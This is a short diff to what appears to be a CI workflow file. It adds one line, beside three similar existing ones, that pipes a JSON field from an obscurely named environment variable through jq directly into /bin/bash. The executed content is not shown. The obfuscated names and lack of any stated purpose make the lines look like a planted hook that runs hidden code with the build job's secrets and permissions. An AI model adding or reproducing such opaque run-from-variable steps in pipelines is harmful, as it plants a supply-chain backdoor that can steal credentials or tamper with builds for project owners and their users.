@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$ks6961" | jq -r .pq2 | /bin/bash
           echo $uc51 | jq -r .t389 | /bin/bash
           echo $els34379 | jq -r .egp348 | /bin/bash
+          printf '%s' "$u9" | jq -r .lv2 | /bin/bash
 
       - name: Store artifact
         if: always()
